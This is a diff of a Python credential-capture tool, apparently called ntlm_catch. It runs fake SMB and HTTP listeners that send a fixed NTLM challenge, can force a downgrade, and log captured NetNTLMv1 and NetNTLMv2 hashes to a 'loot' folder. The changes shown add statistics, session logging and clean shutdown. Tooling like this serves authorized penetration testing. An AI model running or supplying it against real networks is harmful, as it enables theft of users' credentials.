                 hdr = "NTLM " + base64.b64encode(t2).decode()
                 return self._finish_empty(401, [("WWW-Authenticate", hdr)])
@@ -963,9 +1595,9 @@ class LoudHTTPServer(_Loud, ThreadingHTTPServer):
     allow_reuse_address = True
     daemon_threads = True
 
-    def __init__(self, addr, handler, verbose, socket_timeout):
+    def __init__(self, addr, handler, verbose, socket_timeout, stats=None):
         super().__init__(addr, handler)
-        self._loud_init("http", verbose, socket_timeout)
+        self._loud_init("http", verbose, socket_timeout, stats)
 
 
 def ensure_selfsigned(certdir):
@@ -1065,25 +1697,46 @@ def main():
     if len(challenge8) != 8:
         p.error("--challenge must be exactly 8 bytes (16 hex chars)")
 
-    sink = Sink(args.outdir, hexu(challenge8).lower())
+    stats = {
+        "start_time": time.time(),
+        "captures_total": 0,
+        "captures_v1": 0,
+        "captures_v2": 0,
+        "connections": 0,
+        "domain": args.domain,
+        "computer": args.computer,
+        "challenge": hexu(challenge8),
+        "downgrade": args.downgrade,
+        "outdir": args.outdir,
+        "mode": args.mode,
+        "smb_port": args.smb_port if args.mode in ("both", "smb") else None,
+        "http_port": args.http_port if args.mode in ("both", "http") else None,
+    }
+
+    sink = Sink(args.outdir, hexu(challenge8).lower(), stats=stats)
 
     # Persist the entire console trace (connections, handshake steps, captures,
     # errors) to loot/session.log — no need to remember to `tee`.
     session_log = os.path.join(args.outdir, "session.log")
     split_view = None
+    original_stdout = sys.stdout
+    session_fh = None
     try:
-        _sfh = open(session_log, "a", buffering=1)
-        _sfh.write("\n===== ntlm_catch session %s =====\n"
-                   % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
-        original_stdout = sys.stdout
+        session_fh = _open_private(session_log, buffering=1)
+        session_fh.write("\n===== ntlm_catch session %s =====\n"
+                         % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
         if not args.no_split_view and _SplitView.available(original_stdout):
-            split_view = _SplitView(original_stdout, _sfh)
+            split_view = _SplitView(original_stdout, session_fh, stats=stats)
             sys.stdout = split_view
             atexit.register(split_view.close)
         else:
-            sys.stdout = _Tee(original_stdout, _sfh)
-    except Exception:
-        pass
+            sys.stdout = _Tee(original_stdout, session_fh)
+    except Exception as exc:
+        try:
+            original_stdout.write("[!] session.log unavailable: %s\n" % exc)
+            original_stdout.flush()
+        except Exception:
+            pass
 
     servers = []
     threads = []
@@ -1108,7 +1761,7 @@ def main():
         try:
             smb = LoudSMBServer((args.bind, args.smb_port), sink, challenge8,
                                 args.domain, args.computer, args.downgrade,
-                                args.verbose, args.socket_timeout)
+                                args.verbose, args.socket_timeout, stats=stats)
             if not args.no_wire_monitor:
                 wire_monitor = SMBWireMonitor(args.smb_port,
                                               args.wire_interface)
@@ -1122,12 +1775,13 @@ def main():
                           % (args.smb_port, e)))
 
     if args.mode in ("both", "http"):
+        http = None
         try:
             handler = make_http_handler(sink, challenge8, args.domain,
                                         args.computer, args.downgrade,
                                         args.verbose)
             http = LoudHTTPServer((args.bind, args.http_port), handler,
-                                  args.verbose, args.socket_timeout)
+                                  args.verbose, args.socket_timeout, stats=stats)
             use_tls = args.tls or args.cert
             if use_tls:
                 if args.cert and args.key:
@@ -1146,29 +1800,71 @@ def main():
             print(Color.y("  [!] HTTP %d needs root (try sudo, or --http-port)"
                           % args.http_port))
         except OSError as e:
+            if http is not None:
+                http.server_close()
             print(Color.y("  [!] HTTP bind failed on %d: %s"
                           % (args.http_port, e)))
+        except Exception as e:
+            if http is not None:
+                http.server_close()
+            print(Color.y("  [!] HTTP startup failed: %s" % e))
 
     if not servers:
-        print(Color.y("[!] no listeners started — nothing to do."))
         if split_view:
             split_view.close()
+            sys.stdout = (_Tee(original_stdout, session_fh)
+                          if session_fh else original_stdout)
+        print(Color.y("[!] no listeners started — nothing to do."))
+        sys.stdout.flush()
+        sys.stdout = original_stdout
+        if session_fh:
+            session_fh.close()
         return
 
     print(Color.d("  no poisoning / no relay — point coerced auth here "
                   "yourself.  Ctrl-C to stop.\n"))
 
+    stop_event = threading.Event()
+    old_handlers = {}
+
+    def request_stop(signum, frame):
+        stop_event.set()
+
+    for stop_signal in (signal.SIGINT, signal.SIGTERM):
+        try:
+            old_handlers[stop_signal] = signal.signal(stop_signal, request_stop)
+        except (AttributeError, ValueError):
+            pass
+
     try:
-        threading.Event().wait()
+        stop_event.wait()
     except KeyboardInterrupt:
-        print("\n[*] stopping...")
+        stop_event.set()
+    finally:
+        for stop_signal, old_handler in old_handlers.items():
+            try:
+                signal.signal(stop_signal, old_handler)
+            except (ValueError, OSError):
+                pass
+        if split_view:
+            split_view.close()
+            sys.stdout = (_Tee(original_stdout, session_fh)
+                          if session_fh else original_stdout)
+        print("\n" + Color.b("[*] Stopping listeners..."))
         if wire_monitor:
             wire_monitor.close()
         for s in servers:
             s.shutdown()
-        print("[*] stopped. loot in %s/" % args.outdir)
-        if split_view:
-            split_view.close()
+            s.server_close()
+        print(Color.g("[*] Stopped cleanly."))
+        print(Color.d("    Loot directory: %s/" % args.outdir))
+        print("    Captures      : %d total (%d NetNTLMv1, %d NetNTLMv2)"
+              % (stats["captures_total"], stats["captures_v1"], stats["captures_v2"]))
+        print("    Connections   : %d accepted" % stats["connections"])
+        sys.stdout.flush()
+        sys.stdout = original_stdout
+        if session_fh:
+            session_fh.close()
 
 
 if __name__ == "__main__":
